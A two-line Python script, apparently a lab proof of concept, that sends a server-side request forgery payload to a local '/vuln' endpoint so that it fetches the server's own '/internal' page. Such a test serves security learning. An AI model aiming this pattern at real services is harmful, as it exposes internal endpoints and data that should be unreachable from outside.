import requests
print(requests.get("http://127.0.0.1:5000/vuln",params={"url":"http://127.0.0.1:5000/internal"}).text)

